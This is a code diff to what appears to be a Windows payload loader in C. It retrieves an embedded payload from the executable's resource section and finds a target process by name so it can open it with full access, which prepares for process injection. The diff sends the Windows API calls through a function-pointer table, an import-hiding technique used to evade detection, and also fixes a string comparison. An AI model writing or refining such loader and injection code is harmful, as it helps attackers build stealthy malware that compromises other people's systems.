@@ -1,13 +1,13 @@
 #include "Common.h"
 #include "Resource.h"
 
-BOOL ReadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize)
+BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize)
 {
 	HRSRC		hRsrc = NULL;
 	HGLOBAL		hGlobal = NULL;
 
 	// Get the location to the data stored in .rsrc by its id *IDR_RCDATA1*
-	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
+	hRsrc = g_Api.pFindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
 	if (hRsrc == NULL) {
 		// in case of function failure 
 		printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
@@ -15,7 +15,7 @@ BOOL ReadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 	}
 
 	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
-	hGlobal = LoadResource(NULL, hRsrc);
+	hGlobal = g_Api.pLoadResource(NULL, hRsrc);
 	if (hGlobal == NULL) {
 		// in case of function failure 
 		printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
@@ -23,7 +23,7 @@ BOOL ReadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 	}
 
 	// Get the address of our payload in .rsrc section
-	*ppPayloadAddress = LockResource(hGlobal);
+	*ppPayloadAddress = g_Api.pLockResource(hGlobal);
 	if (*ppPayloadAddress == NULL) {
 		// in case of function failure 
 		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
@@ -31,7 +31,7 @@ BOOL ReadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 	}
 
 	// Get the size of our payload in .rsrc section
-	*pPayloadSize = SizeofResource(NULL, hRsrc);
+	*pPayloadSize = g_Api.pSizeofResource(NULL, hRsrc);
 	if (*pPayloadSize == 0) {
 		// in case of function failure 
 		printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
@@ -79,9 +79,9 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* 
 	while (TRUE) {
 		// Small check for the process's name size
 		// Comparing the enumerated process name to what we want to target
-		if (SystemProcInfo->ImageName.Length && IsStringEqual(szProcName, SystemProcInfo->ImageName.Buffer) == 0) {
+		if (SystemProcInfo->ImageName.Length && IsStringEqual(szProcName, SystemProcInfo->ImageName.Buffer) == TRUE) {
 			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
-			*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
+			*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
 			break;
 		}
 
